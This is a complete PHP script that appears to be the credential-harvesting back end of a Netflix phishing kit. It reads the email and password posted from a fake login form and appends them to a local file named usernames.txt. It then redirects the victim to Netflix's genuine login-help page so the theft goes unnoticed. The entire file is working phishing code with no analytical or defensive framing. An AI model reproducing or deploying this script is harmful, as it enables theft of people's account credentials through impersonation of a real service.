<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_POST['email'] && $_POST['password']) {
    $data = "Netflix Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n";
    $result = file_put_contents("usernames.txt", $data, FILE_APPEND);
    if ($result === false) {
        die("Gagal menyimpan file!");
    }
}
header('Location: https://www.netflix.com/us/LoginHelp');
exit();
?>